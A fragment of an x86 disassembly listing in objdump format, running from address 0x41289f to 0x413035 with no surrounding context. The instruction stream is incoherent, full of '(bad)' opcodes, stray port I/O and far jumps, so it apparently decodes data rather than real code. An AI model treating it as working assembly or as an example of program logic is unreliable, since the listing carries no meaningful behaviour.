  41289f:	xchg   ecx,ecx
  4128a1:	push   ss
  4128a2:	stos   DWORD PTR es:[edi],eax
  4128a3:	cmc    
  4128a4:	mov    cl,0x41
  4128a6:	dec    esp
  4128a7:	inc    esp
  4128a8:	sbb    al,0x55
  4128aa:	gs sti 
  4128ac:	outs   dx,DWORD PTR ds:[esi]
  4128ad:	pop    esp
  4128ae:	out    dx,al
  4128af:	imul   esp,edx,0x9543c2dc
  4128b5:	push   ecx
  4128b6:	lock mov edi,0xde95c8db
  4128bc:	cmp    al,0xe8
  4128be:	sub    al,0x29
  4128c0:	sbb    al,0x3f
  4128c2:	mov    esi,0x3a33a6a4
  4128c7:	mov    ah,bh
  4128c9:	shl    eax,0x42
  4128cc:	mov    eax,0xd487de9e
  4128d1:	jne    0x4128e8
  4128d3:	mov    ds:0xff7a3e8f,al
  4128d8:	and    bl,bl
  4128da:	sbb    BYTE PTR [edx-0x40],0x27
  4128de:	dec    ecx
  4128df:	jl     0x412875
  4128e1:	das    
  4128e2:	or     al,0x44
  4128e4:	inc    edi
  4128e5:	clc    
  4128e6:	icebp  
  4128e7:	js     0x4128b3
  4128e9:	loopne 0x4128b5
  4128eb:	fdiv   DWORD PTR [ecx]
  4128ed:	aas    
  4128ee:	xor    bl,BYTE PTR [eax+0x45badc29]
  4128f4:	cwde   
  4128f5:	mov    ebx,0xd18c7499
  4128fa:	adc    DWORD PTR [ecx],ebx
  4128fc:	or     al,BYTE PTR [ecx+0x56]
  4128ff:	jmp    0x412958
  412901:	mov    ebp,0x22d7c009
  412906:	mov    ch,0xd3
  412908:	pop    ecx
  412909:	inc    ebp
  41290a:	pop    edx
  41290b:	add    DWORD PTR [ebp-0x7c],esp
  41290e:	cmp    eax,0x34ca7ea3
  412913:	adc    eax,DWORD PTR [esi+0x12]
  412916:	ret    
  412917:	jne    0x412936
  412919:	add    eax,0x3b8de846
  41291e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41291f:	push   eax
  412920:	pop    ds
  412921:	xchg   edi,eax
  412922:	xchg   edx,eax
  412923:	sub    eax,0x6b406008
  412928:	cwde   
  412929:	out    dx,eax
  41292a:	das    
  41292b:	cld    
  41292c:	ins    BYTE PTR es:[edi],dx
  41292d:	jle    0x412958
  41292f:	adc    ebx,DWORD PTR [eax+esi*8-0x55c77640]
  412936:	or     DWORD PTR [ebp-0x52bbd48a],0x5d638488
  412940:	or     al,0x8
  412942:	rol    al,cl
  412944:	xchg   DWORD PTR [ecx-0x15],edi
  412947:	pop    ecx
  412948:	mov    ecx,0x3714c895
  41294d:	mov    DWORD PTR [ecx+0x7],ebx
  412950:	test   BYTE PTR [ebp+eiz*8+0x4e],dh
  412954:	mov    ds:0xbf6229c,eax
  412959:	test   al,0x78
  41295b:	xchg   edx,eax
  41295c:	in     al,dx
  41295d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41295e:	mov    bl,0x65
  412960:	lods   eax,DWORD PTR ds:[esi]
  412961:	or     eax,0x16abe74
  412966:	push   eax
  412967:	add    eax,0xa5ddde80
  41296c:	pop    ds
  41296d:	adc    bh,0xb3
  412970:	sbb    DWORD PTR [ecx],ecx
  412972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412973:	push   ebx
  412974:	push   es
  412975:	and    BYTE PTR [eax],cl
  412977:	inc    ecx
  412978:	add    BYTE PTR [edx-0x1048c01a],bl
  41297e:	mov    esp,0x8f9a7759
  412983:	inc    edi
  412984:	pop    ecx
  412985:	add    al,0x9
  412987:	psubusb mm0,mm7
  41298a:	repz lahf 
  41298c:	push   0xffffffa3
  41298e:	imul   ebp,DWORD PTR [eax],0x4426722e
  412994:	test   DWORD PTR [ebx-0x36],esi
  412997:	pop    edx
  412998:	push   ebx
  412999:	retf   
  41299a:	sar    DWORD PTR [esi+0x6b],0xab
  41299e:	and    al,0x12
  4129a0:	dec    esp
  4129a1:	frstor ds:[esp+eax*8+0x29]
  4129a6:	pushf  
  4129a7:	ret    0xb6c1
  4129aa:	test   eax,0x7cffb1c9
  4129af:	cmp    al,0x5e
  4129b1:	pushf  
  4129b2:	or     ebp,DWORD PTR ds:0xb52a4804
  4129b8:	jecxz  0x412967
  4129ba:	and    dh,BYTE PTR [edx-0x1d0cc524]
  4129c0:	out    0x5a,al
  4129c2:	add    bh,ah
  4129c4:	push   ebx
  4129c5:	cmp    esp,DWORD PTR [eax]
  4129c7:	lods   eax,DWORD PTR ds:[esi]
  4129c8:	(bad)  
  4129c9:	mov    al,0x2
  4129cb:	les    eax,FWORD PTR [eax+0x3f182586]
  4129d1:	cmp    ah,dh
  4129d3:	add    esp,DWORD PTR [ebp-0x6e]
  4129d6:	mov    edx,0x8490d466
  4129db:	inc    ecx
  4129dc:	nop
  4129dd:	(bad)  
  4129de:	pop    esp
  4129df:	push   ds
  4129e0:	out    0xf0,eax
  4129e2:	pop    ebp
  4129e3:	iret   
  4129e4:	outs   dx,BYTE PTR ds:[esi]
  4129e5:	icebp  
  4129e6:	stc    
  4129e7:	mov    ch,BYTE PTR ds:0xce842078
  4129ed:	sub    bh,bh
  4129ef:	or     eax,0xd9b66b1d
  4129f4:	jmp    0xd47e6dcd
  4129f9:	xor    eax,edi
  4129fb:	fadd   st(1),st
  4129fd:	mov    ebp,0xd7dec9b5
  412a02:	cmp    al,0x3a
  412a04:	mov    esi,0x50e4f88
  412a09:	xchg   ecx,eax
  412a0a:	mov    BYTE PTR [eax],dh
  412a0c:	xchg   DWORD PTR [si-0x17],eax
  412a10:	and    bh,BYTE PTR [edx+ecx*8]
  412a13:	hlt    
  412a14:	jle    0x41299c
  412a16:	pop    esi
  412a17:	shl    DWORD PTR [ebp-0x7e],1
  412a1a:	fwait
  412a1b:	mov    cl,0xc5
  412a1d:	imul   ebx,ebp,0xacd37499
  412a23:	adc    bl,cl
  412a25:	adc    BYTE PTR [edi+0x6],ah
  412a28:	mov    ds:0x5ad5593d,eax
  412a2d:	pop    ds
  412a2e:	and    bl,BYTE PTR [esi-0xb]
  412a31:	cmp    DWORD PTR [ecx-0x2e1f99d7],0x5c1eb04b
  412a3b:	jecxz  0x4129fb
  412a3d:	adc    al,BYTE PTR [esi]
  412a3f:	mov    ecx,0x17bb143d
  412a44:	push   eax
  412a45:	pop    es
  412a46:	iret   
  412a47:	push   ebx
  412a48:	mov    ah,0x37
  412a4a:	div    BYTE PTR [esi]
  412a4c:	aam    0xef
  412a4e:	out    0x34,eax
  412a50:	(bad)  
  412a51:	and    eax,0xb6d24bf2
  412a56:	adc    al,0x70
  412a58:	xchg   ecx,eax
  412a59:	mov    WORD PTR [ebp-0x66],?
  412a5c:	xlat   BYTE PTR ds:[ebx]
  412a5d:	jbe    0x4129e5
  412a5f:	add    DWORD PTR [edx-0x4],edx
  412a62:	out    0x29,eax
  412a64:	cdq    
  412a65:	jo     0x412a0a
  412a67:	mov    WORD PTR [ebx-0x734905b4],?
  412a6d:	loop   0x412a58
  412a6f:	mov    al,ds:0x1dabc585
  412a74:	ds inc ebp
  412a76:	add    al,0x9c
  412a78:	fadd   DWORD PTR [ebp-0x42a62fbc]
  412a7e:	sub    DWORD PTR [edi+0x1],0xffffffe5
  412a82:	sub    BYTE PTR [edi],cl
  412a84:	scas   eax,DWORD PTR es:[edi]
  412a85:	sub    DWORD PTR [eax-0x6f845e7e],esp
  412a8b:	mov    eax,ds:0xb517bf16
  412a90:	inc    ecx
  412a91:	(bad)  
  412a92:	dec    ebp
  412a93:	imul   edi,DWORD PTR [edx],0x13
  412a96:	and    eax,0x8476ae6b
  412a9b:	sub    eax,0xbff40afc
  412aa0:	dec    edx
  412aa1:	push   ss
  412aa2:	pop    ecx
  412aa3:	xchg   esi,eax
  412aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa5:	lods   eax,DWORD PTR ds:[esi]
  412aa6:	inc    edi
  412aa7:	lock mov al,0x98
  412aaa:	sti    
  412aab:	jl     0x412b16
  412aad:	scas   al,BYTE PTR es:[edi]
  412aae:	dec    ecx
  412aaf:	mov    esp,0xd228a288
  412ab4:	inc    edx
  412ab5:	pop    ebp
  412ab6:	mov    ebp,0x11ccd02e
  412abb:	xor    BYTE PTR cs:[eax],ah
  412abe:	jp     0x412a50
  412ac0:	outs   dx,DWORD PTR ds:[esi]
  412ac1:	add    al,BYTE PTR [ebx]
  412ac3:	cli    
  412ac4:	dec    ebx
  412ac5:	jb     0x412aac
  412ac7:	repnz aad 0xdd
  412aca:	mov    esi,0x29db25cf
  412acf:	into   
  412ad0:	mov    al,ds:0x35cc169
  412ad5:	or     BYTE PTR [ebp-0x3a],ch
  412ad8:	cmc    
  412ad9:	mov    ebp,0x640243c
  412ade:	imul   ecx,DWORD PTR [esi-0x19],0xb90b0eea
  412ae5:	outs   dx,BYTE PTR ds:[esi]
  412ae6:	test   BYTE PTR [ecx*2+0x2d5e1251],ch
  412aed:	or     al,0x65
  412aef:	ss cmp bl,ch
  412af2:	push   eax
  412af3:	jge    0x412ade
  412af5:	inc    ebx
  412af6:	xchg   ebx,eax
  412af7:	les    ecx,FWORD PTR [ebx+0x9675862]
  412afd:	dec    edi
  412afe:	ret    0x6f22
  412b01:	retf   
  412b02:	repz jno 0x412af9
  412b05:	add    eax,0x138f2461
  412b0a:	jg     0x412af0
  412b0c:	dec    ebp
  412b0d:	pop    ss
  412b0e:	loopne 0x412a95
  412b10:	cs loopne 0x412ad8
  412b13:	jb     0x412b16
  412b15:	cmp    BYTE PTR [ecx+0x5196e47b],bh
  412b1b:	push   eax
  412b1c:	scas   eax,DWORD PTR es:[edi]
  412b1d:	clc    
  412b1e:	dec    ebx
  412b1f:	clc    
  412b20:	mov    esp,0x3ba84edf
  412b25:	cmp    eax,0xfa5a6c3c
  412b2a:	stos   DWORD PTR es:[edi],eax
  412b2b:	pushf  
  412b2c:	push   ebp
  412b2d:	mov    edi,0x80c573ca
  412b32:	sub    ch,ch
  412b34:	pop    eax
  412b35:	mov    ah,0xcf
  412b37:	(bad)  
  412b38:	jle    0x412b1d
  412b3a:	jae    0x412ae4
  412b3c:	dec    esi
  412b3d:	retf   0xee78
  412b40:	sub    DWORD PTR [esp+edi*1],edx
  412b43:	and    BYTE PTR [esi+0x1d4a4d5a],cl
  412b49:	xor    ebx,0x75b8c854
  412b4f:	push   ebx
  412b50:	xor    edx,esp
  412b52:	out    0x8e,al
  412b54:	pop    ebp
  412b55:	push   eax
  412b56:	mov    eax,0x152f7df2
  412b5b:	sbb    dl,BYTE PTR [ebx+0x38]
  412b5e:	cld    
  412b5f:	arpl   WORD PTR [edi+0x38775ace],ax
  412b65:	outs   dx,BYTE PTR ds:[esi]
  412b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b67:	lock es test al,0x4
  412b6b:	sbb    DWORD PTR [ebp-0x40ba4b55],eax
  412b71:	mov    esi,0x60f1abf8
  412b76:	cmp    BYTE PTR [esi+ebp*1+0x45],dl
  412b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b7b:	push   edx
  412b7c:	adc    al,BYTE PTR [esi-0x275ff7ec]
  412b82:	ss xchg ebp,eax
  412b84:	fs call 0x7e50:0xcf637c16
  412b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b8d:	scas   al,BYTE PTR es:[edi]
  412b8e:	cld    
  412b8f:	das    
  412b90:	xlat   BYTE PTR ds:[ebx]
  412b91:	mov    cl,0x49
  412b93:	or     DWORD PTR [edx-0x1d704535],0xb91f1c8
  412b9d:	test   DWORD PTR [eax-0xc0c01b8],esp
  412ba3:	and    eax,0x1b7491cd
  412ba8:	jge    0x412b4b
  412baa:	sub    al,0xd6
  412bac:	mov    ebx,0xa137ce49
  412bb1:	dec    edx
  412bb2:	xor    dh,bl
  412bb4:	add    bl,BYTE PTR [edi+0x52]
  412bb7:	push   ss
  412bb8:	xchg   esp,eax
  412bb9:	out    0x52,al
  412bbb:	mov    edx,DWORD PTR [esi]
  412bbd:	jge    0x412bc2
  412bbf:	mov    cl,0xbd
  412bc1:	push   ebx
  412bc2:	mov    WORD PTR [ecx+0x68],ss
  412bc5:	call   0x7f127777
  412bca:	lods   eax,DWORD PTR ds:[esi]
  412bcb:	in     al,dx
  412bcc:	sub    BYTE PTR ds:0xc756eb6c,dl
  412bd2:	lods   eax,DWORD PTR ds:[esi]
  412bd3:	push   esp
  412bd4:	jne    0x412c41
  412bd6:	xlat   BYTE PTR ds:[ebx]
  412bd7:	add    bh,dh
  412bd9:	sub    BYTE PTR [edx-0x380f7e8],ch
  412bdf:	ins    BYTE PTR es:[edi],dx
  412be0:	hlt    
  412be1:	(bad)  
  412be2:	out    0x4c,al
  412be4:	aas    
  412be5:	loop   0x412b71
  412be7:	retf   0x11a5
  412bea:	imul   ecx,DWORD PTR [esi-0x3e],0xffffffa5
  412bee:	leave  
  412bef:	cmp    eax,0xf67eb3d3
  412bf4:	mov    al,0x6e
  412bf6:	test   DWORD PTR [edi],esi
  412bf8:	imul   ecx,DWORD PTR [esi+ebp*1],0x32
  412bfc:	mov    ecx,DWORD PTR [ebx]
  412bfe:	hlt    
  412bff:	cmc    
  412c00:	sbb    DWORD PTR [ecx],ebx
  412c02:	jmp    0xc6b:0x9209dfc
  412c09:	fdiv   DWORD PTR [ebx+0x69]
  412c0c:	xchg   DWORD PTR [ebx-0x62],eax
  412c0f:	jb     0x412bfd
  412c11:	lods   eax,DWORD PTR ds:[esi]
  412c12:	das    
  412c13:	jb     0x412c8a
  412c15:	xlat   BYTE PTR ds:[ebx]
  412c16:	mov    esi,ebx
  412c18:	dec    edi
  412c19:	ins    BYTE PTR es:[edi],dx
  412c1a:	mov    esi,0xeaeea894
  412c1f:	mov    eax,0xfe18cea
  412c24:	ins    BYTE PTR es:[edi],dx
  412c25:	mov    al,ds:0x98fedd03
  412c2a:	xor    al,0xfe
  412c2c:	shl    ecx,cl
  412c2e:	(bad)  
  412c2f:	ss add al,0x8c
  412c32:	leave  
  412c33:	fisttp QWORD PTR [ebx-0x639eb908]
  412c39:	retf   0xa8a1
  412c3c:	push   ebp
  412c3d:	in     eax,0xe7
  412c3f:	mov    dh,0x10
  412c41:	jl     0x412c22
  412c43:	and    al,0x79
  412c45:	sbb    BYTE PTR [edi+ecx*1+0x1d729fd5],ch
  412c4c:	sar    BYTE PTR [ebx],0xf1
  412c4f:	enter  0x9e94,0xf4
  412c53:	popa   
  412c54:	mov    ebx,0xeeeee320
  412c59:	add    DWORD PTR [ebp+0x5f],edx
  412c5c:	pop    esi
  412c5d:	pop    ecx
  412c5e:	shl    DWORD PTR [edi-0x53],cl
  412c61:	push   ebp
  412c62:	test   esp,0xcd1db384
  412c68:	mov    WORD PTR [ecx+edx*1],gs
  412c6b:	sbb    eax,0xea2b4e5f
  412c70:	test   al,0xd7
  412c72:	sbb    DWORD PTR [eax+0x3e],ecx
  412c75:	outs   dx,BYTE PTR ds:[esi]
  412c76:	clc    
  412c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c78:	push   edi
  412c79:	mov    cl,0x28
  412c7b:	neg    DWORD PTR [edi+0x61]
  412c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7f:	sti    
  412c80:	add    DWORD PTR [ebp-0x9526981],edx
  412c86:	push   esp
  412c87:	ret    
  412c88:	stos   BYTE PTR es:[edi],al
  412c89:	mov    edi,0x75577187
  412c8e:	jno    0x412d0c
  412c90:	hlt    
  412c91:	das    
  412c92:	jecxz  0x412c9e
  412c94:	sub    edi,ecx
  412c96:	xchg   edi,eax
  412c97:	push   esi
  412c98:	inc    ecx
  412c99:	(bad)  
  412c9a:	addr16 pop ds
  412c9c:	push   cs
  412c9d:	shl    BYTE PTR [ecx+0x94aa07c],cl
  412ca3:	jp     0x412c95
  412ca5:	retf   0x347c
  412ca8:	fdivr  QWORD PTR [ecx+esi*4-0x6]
  412cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cad:	fcomp  QWORD PTR [esi]
  412caf:	loop   0x412c33
  412cb1:	jbe    0x412c86
  412cb3:	xchg   esp,eax
  412cb4:	pop    ss
  412cb5:	(bad)  
  412cb6:	ret    0x334
  412cb9:	inc    esi
  412cba:	xor    cl,BYTE PTR [edx]
  412cbc:	pop    ebp
  412cbd:	dec    ebp
  412cbe:	dec    edi
  412cbf:	bound  ebx,QWORD PTR [edi-0x41]
  412cc2:	push   ss
  412cc3:	mov    ebx,ecx
  412cc5:	scas   eax,DWORD PTR es:[edi]
  412cc6:	aad    0x16
  412cc8:	xor    DWORD PTR [eax-0x56370401],esp
  412cce:	jl     0x412c7c
  412cd0:	jnp    0x66797ceb
  412cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cd7:	xchg   cl,dl
  412cd9:	leave  
  412cda:	(bad)  
  412cdb:	jnp    0x412d16
  412cdd:	retf   0x19f4
  412ce0:	pop    esi
  412ce1:	dec    edx
  412ce2:	(bad)  
  412ce3:	ss std 
  412ce5:	push   0x53
  412ce7:	mov    edi,0xf970a3be
  412ced:	(bad)  
  412cee:	(bad)  
  412cf0:	mov    DWORD PTR [esi],eax
  412cf2:	push   ebp
  412cf3:	mov    ds:0x7d65ee79,al
  412cf8:	loopne 0x412c84
  412cfa:	ss aam 0x8f
  412cfd:	xchg   ecx,eax
  412cfe:	fisttp DWORD PTR [edx+0x734877f7]
  412d04:	inc    ebp
  412d05:	pop    ebp
  412d06:	stos   DWORD PTR es:[edi],eax
  412d07:	pusha  
  412d08:	xchg   ebp,eax
  412d09:	jmp    0x412cec
  412d0b:	pusha  
  412d0c:	ins    DWORD PTR es:[edi],dx
  412d0d:	inc    ebx
  412d0e:	out    dx,eax
  412d0f:	shl    DWORD PTR [ebx+0x15ed1ce4],0x2a
  412d16:	bsr    edi,DWORD PTR [bx+di]
  412d1a:	mov    edx,DWORD PTR [esp+eax*8-0x6b]
  412d1e:	ror    ah,1
  412d20:	int    0xb0
  412d22:	pop    esp
  412d23:	jbe    0x412d25
  412d25:	sbb    esi,DWORD PTR [eax+0x1186f511]
  412d2b:	gs data16 jge 0x412d25
  412d2f:	ins    DWORD PTR es:[edi],dx
  412d30:	jnp    0x412d9e
  412d32:	cld    
  412d33:	dec    ecx
  412d34:	jmp    0x412d29
  412d36:	or     BYTE PTR [ecx],bh
  412d38:	and    esi,edx
  412d3a:	sbb    al,dl
  412d3c:	inc    esp
  412d3d:	stos   BYTE PTR es:[edi],al
  412d3e:	imul   ecx,DWORD PTR [edi-0x57],0xffffffb7
  412d42:	sbb    al,0xbe
  412d44:	imul   eax,esp,0xad626233
  412d4a:	pop    ebp
  412d4b:	xor    al,BYTE PTR [edi]
  412d4d:	repnz fcmovb st,st(6)
  412d50:	or     cl,dl
  412d52:	gs cmp dl,dh
  412d55:	cdq    
  412d56:	dec    ebp
  412d57:	pop    esi
  412d58:	jbe    0x412dd1
  412d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d5b:	retf   0xd0f7
  412d5e:	ins    BYTE PTR es:[edi],dx
  412d5f:	add    eax,0x476ca862
  412d64:	fisttp QWORD PTR [ebx+0x12]
  412d67:	add    edi,esi
  412d69:	mov    edx,DWORD PTR [edx]
  412d6b:	lea    edx,[ebx-0x49]
  412d6e:	fnstsw WORD PTR [edx+0x48f69d88]
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	int    0x1e
  412d77:	mov    edx,0xbae93c76
  412d7c:	push   edx
  412d7d:	test   eax,0xf7080926
  412d82:	ss sbb eax,0x63af845f
  412d88:	cmp    DWORD PTR [eax],esi
  412d8a:	dec    ebx
  412d8b:	call   0x538e4f01
  412d90:	adc    eax,0xb52360b3
  412d95:	mov    esp,0xc4330394
  412d9a:	sub    DWORD PTR [edx-0x13bc3ad0],eax
  412da0:	pop    esi
  412da1:	int    0xbe
  412da3:	fdivr  QWORD PTR [edi+0x727d1d16]
  412da9:	jg     0x412d9a
  412dab:	pushf  
  412dac:	mov    BYTE PTR [edi+0x51],0xe0
  412db0:	mov    ah,0x5d
  412db2:	retf   0xd9e8
  412db5:	push   ds
  412db6:	popa   
  412db7:	adc    ecx,ecx
  412db9:	mov    WORD PTR [edi],ds
  412dbb:	enter  0xbed,0xde
  412dbf:	sahf   
  412dc0:	mov    ecx,0xd439d545
  412dc5:	fidivr DWORD PTR [edx-0x67]
  412dc8:	inc    ebx
  412dc9:	cwde   
  412dca:	jno    0x412e35
  412dcc:	outs   dx,BYTE PTR ds:[esi]
  412dcd:	adc    eax,0x47f21a24
  412dd2:	hlt    
  412dd3:	push   es
  412dd4:	std    
  412dd5:	mov    eax,gs
  412dd7:	adc    al,cl
  412dd9:	or     ebx,ebx
  412ddb:	rcr    DWORD PTR [edx-0x748da097],0xc4
  412de2:	jecxz  0x412e26
  412de4:	xor    cl,BYTE PTR [edx+0x7e78e885]
  412dea:	inc    edi
  412deb:	add    DWORD PTR [esi+0x659ad922],0x7114f4d8
  412df5:	int    0xf
  412df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412df8:	inc    esi
  412df9:	and    edx,esp
  412dfb:	mov    fs,WORD PTR [ecx-0x1a]
  412dfe:	clc    
  412dff:	faddp  st(2),st
  412e01:	add    ecx,ebp
  412e03:	int3   
  412e04:	test   al,0xa4
  412e06:	xchg   BYTE PTR [edx],cl
  412e08:	int    0x4c
  412e0a:	sub    al,0xcf
  412e0c:	ja     0x412da2
  412e0e:	sub    ecx,DWORD PTR [esi+ecx*8+0x5e897c67]
  412e15:	adc    BYTE PTR [esp+edi*2+0x73],0x7
  412e1a:	xor    ebp,ebp
  412e1c:	sub    al,0x2a
  412e1e:	push   ds
  412e1f:	mov    ebx,0x3544e2e7
  412e24:	mov    eax,ds:0xb5b2c99e
  412e29:	push   ebp
  412e2a:	dec    eax
  412e2b:	test   eax,0xaca8da8
  412e30:	jp     0x4e9b9a40
  412e36:	nop
  412e37:	dec    ebx
  412e38:	sar    BYTE PTR ds:0x3dcb48b,1
  412e3e:	pop    edx
  412e3f:	repnz push 0xffffffb6
  412e42:	call   0xce31:0x283a1767
  412e49:	nop
  412e4a:	lds    edi,FWORD PTR [eax-0x145525ff]
  412e50:	add    al,0x9c
  412e52:	push   cs
  412e53:	or     al,0xac
  412e55:	neg    BYTE PTR [edx+edx*4-0x3229cb7b]
  412e5c:	dec    esi
  412e5d:	ret    0x6cda
  412e60:	ja     0x412e54
  412e62:	mov    esp,0xba292f94
  412e67:	xchg   edi,eax
  412e68:	sbb    ebx,ebp
  412e6a:	xchg   ecx,eax
  412e6b:	and    edx,ebp
  412e6d:	sub    DWORD PTR [eax+0x41642b96],edx
  412e73:	mov    bl,0xd7
  412e75:	push   ebx
  412e76:	sbb    BYTE PTR [eax+0x271b145c],0x91
  412e7d:	sbb    esp,edi
  412e7f:	clc    
  412e80:	addr16 adc al,0xc1
  412e83:	ret    
  412e84:	dec    ecx
  412e85:	sub    BYTE PTR [esi+0x14],ch
  412e88:	mov    ah,0x5
  412e8a:	rcr    BYTE PTR [bx+di],cl
  412e8d:	jbe    0x412ea6
  412e8f:	pop    edx
  412e90:	xor    al,0xcb
  412e92:	cmc    
  412e93:	cmp    eax,0xf2d8e783
  412e98:	lods   al,BYTE PTR ds:[esi]
  412e99:	mov    dl,0x36
  412e9b:	(bad)  [ebx-0x5f]
  412e9e:	in     eax,dx
  412e9f:	sub    al,0x14
  412ea1:	jmp    0x3d5eaaa8
  412ea6:	sbb    edx,ebx
  412ea8:	mov    BYTE PTR [edx-0x38],dh
  412eab:	or     eax,0x42441ddb
  412eb0:	mov    esi,?
  412eb2:	mov    edx,0x88ebb820
  412eb7:	cmp    eax,0x9bded972
  412ebc:	mov    esi,0x8cd1ece2
  412ec1:	sbb    dl,BYTE PTR [ebx]
  412ec3:	jge    0x412ec0
  412ec5:	push   0x71
  412ec7:	int    0x87
  412ec9:	cmc    
  412eca:	mov    edi,0xe04c0ca3
  412ecf:	in     al,0xd9
  412ed1:	lahf   
  412ed2:	pop    ecx
  412ed3:	and    eax,0xcdd726c4
  412ed8:	(bad)  
  412ed9:	cmc    
  412eda:	(bad)  
  412edb:	stos   BYTE PTR es:[edi],al
  412edc:	jl     0x412f31
  412ede:	cmp    cl,dl
  412ee0:	inc    edx
  412ee1:	jno    0x412eaa
  412ee3:	(bad)  
  412ee5:	jae    0x412f05
  412ee7:	mov    bl,0xdb
  412ee9:	sar    DWORD PTR [ecx-0x3],cl
  412eec:	sar    edi,cl
  412eee:	dec    edi
  412eef:	push   ebx
  412ef0:	push   ecx
  412ef1:	scas   al,BYTE PTR es:[edi]
  412ef2:	dec    esi
  412ef3:	imul   edx,DWORD PTR [edi+eax*8+0x7d],0xffffffea
  412ef8:	in     al,0x62
  412efa:	add    cl,al
  412efc:	adc    DWORD PTR [esp+ebx*4+0x453ec198],edi
  412f03:	in     eax,dx
  412f04:	scas   al,BYTE PTR es:[edi]
  412f05:	xor    BYTE PTR [ebp-0x53],ah
  412f08:	push   esi
  412f09:	dec    esi
  412f0a:	jmp    0x412f3a
  412f0c:	mov    esp,0x5db0aea4
  412f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f12:	adc    eax,DWORD PTR [ecx+ebp*4+0x57618821]
  412f19:	sbb    eax,DWORD PTR [esp+edi*8]
  412f1c:	pop    esi
  412f1d:	ficom  WORD PTR [esi]
  412f1f:	fs dec ebx
  412f21:	xchg   esi,eax
  412f22:	test   BYTE PTR [edx-0x69c9a7ee],ch
  412f28:	push   ebx
  412f29:	stc    
  412f2a:	(bad)  
  412f2c:	adc    edx,edi
  412f2e:	push   esi
  412f2f:	pop    ds
  412f30:	test   al,0x8d
  412f32:	push   esi
  412f33:	icebp  
  412f34:	mov    ch,0x80
  412f36:	push   esi
  412f37:	sub    BYTE PTR [edx+0x4c9b64a5],al
  412f3d:	sbb    al,0x78
  412f3f:	xor    BYTE PTR [ebp-0x2],al
  412f42:	xor    ah,0xd
  412f45:	call   0x53317036
  412f4a:	push   esp
  412f4b:	push   es
  412f4c:	adc    DWORD PTR [ebp-0x72],0x4e
  412f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f51:	dec    eax
  412f52:	dec    eax
  412f53:	jl     0x412f90
  412f55:	stc    
  412f56:	add    DWORD PTR es:[esi+0x67],eax
  412f5a:	js     0x412f37
  412f5c:	xchg   edi,eax
  412f5d:	jecxz  0x412fae
  412f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f60:	ss test eax,0x8f51f765
  412f66:	and    bh,al
  412f68:	mov    ah,0x7d
  412f6a:	jl     0x412f4d
  412f6c:	or     ecx,DWORD PTR [ebx+ebx*4]
  412f6f:	lods   al,BYTE PTR ds:[esi]
  412f70:	aad    0xa2
  412f72:	mov    al,ds:0xdc96f774
  412f77:	cmc    
  412f78:	popf   
  412f79:	push   eax
  412f7a:	jp     0x412f05
  412f7c:	or     ebx,esp
  412f7e:	cmp    al,0xaf
  412f80:	fwait
  412f81:	rol    BYTE PTR [edi],cl
  412f83:	add    BYTE PTR [ecx+0x736db9b8],ch
  412f89:	call   0xd0c1:0xb3849470
  412f90:	jo     0x412f47
  412f92:	or     eax,0xd02319
  412f97:	in     eax,0xa8
  412f99:	mov    esp,0xf3f6f1d7
  412f9e:	xchg   ebx,eax
  412f9f:	shl    bl,cl
  412fa1:	leave  
  412fa2:	mov    eax,0x19f57df9
  412fa7:	lods   eax,DWORD PTR ds:[esi]
  412fa8:	or     ebp,edi
  412faa:	mov    ah,BYTE PTR [eax+0x52]
  412fad:	mov    ch,0x38
  412faf:	nop
  412fb0:	dec    ebx
  412fb1:	idiv   DWORD PTR [ecx+0x35]
  412fb4:	sahf   
  412fb5:	in     eax,0x67
  412fb7:	jecxz  0x412f54
  412fb9:	mov    dl,0x6f
  412fbb:	mov    esp,gs
  412fbd:	mov    ecx,0x21ea1b87
  412fc2:	fiadd  DWORD PTR [edx*4+0x7bf1dc2d]
  412fc9:	mov    bh,0xb7
  412fcb:	push   esp
  412fcc:	push   eax
  412fcd:	sub    al,0xe0
  412fcf:	ffreep st(2)
  412fd1:	mov    dl,cl
  412fd3:	fdivr  DWORD PTR [eax+0xbda75e4]
  412fd9:	pop    DWORD PTR [eax+0x78]
  412fdc:	push   ecx
  412fdd:	in     eax,dx
  412fde:	inc    ecx
  412fdf:	adc    DWORD PTR [edx+0x33],edx
  412fe2:	in     eax,dx
  412fe3:	pop    edi
  412fe4:	pusha  
  412fe5:	pop    ss
  412fe6:	rol    BYTE PTR [edi],1
  412fe8:	add    al,0xf8
  412fea:	fdiv   DWORD PTR [eax+0x6e0c5f98]
  412ff0:	adc    bh,dh
  412ff2:	push   edx
  412ff3:	xchg   ebx,eax
  412ff4:	dec    eax
  412ff5:	jmp    0x5c37:0xa45296b
  412ffc:	push   ecx
  412ffd:	sub    BYTE PTR [ebp+0x52],ah
  413000:	push   0xfc07a117
  413005:	outs   dx,BYTE PTR gs:[esi]
  413007:	inc    ebx
  413008:	cld    
  413009:	fstp   DWORD PTR [ecx-0x42]
  41300c:	sbb    BYTE PTR [ebx],bh
  41300e:	dec    edi
  41300f:	call   ebp
  413011:	test   DWORD PTR ds:0xd51540ad,esi
  413017:	sbb    DWORD PTR ds:[edx+ebp*2+0x6d8ec472],ebx
  41301f:	pop    esi
  413020:	dec    ecx
  413021:	push   esi
  413022:	mov    ds:0xb8e80d97,eax
  413027:	addr16 aas 
  413029:	mov    ds:0x5837767,eax
  41302e:	sub    BYTE PTR [esi+0x65],dh
  413031:	jge    0x413066
  413033:	lahf   
  413034:	(bad)  
  413035:	stos   DWORD PTR es:[edi],eax
